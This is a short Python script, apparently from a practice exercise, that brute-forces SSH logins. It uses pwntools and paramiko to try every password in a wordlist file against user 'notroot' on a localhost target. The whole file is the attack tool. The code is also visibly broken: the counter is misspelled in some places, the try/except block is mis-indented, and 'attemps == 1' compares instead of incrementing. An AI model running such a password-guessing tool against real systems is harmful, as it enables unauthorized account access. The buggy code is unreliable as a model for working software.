from pwn import *
import paramiko

host = "127.0.0.1"
username  = "notroot"
attemps = 0

with open("ssh-command-passwords.txt", "r") as password_list:
  for password in password_list:
    password = password.strip("\n")
    try:
       print("[{}] Attemping password: '{}'!".format(attempts, password))
       response = ssh(host=host, user=username, password=password, timeout=1)
       if response.connected():
         print("[>] Valid Password Found: '{}'!".format(password))
         response.close()
         break
        response.close()
       except paramiko.ssh_exception.AuthenticationException:
        print("[X] Invalid Password!")
       attemps == 1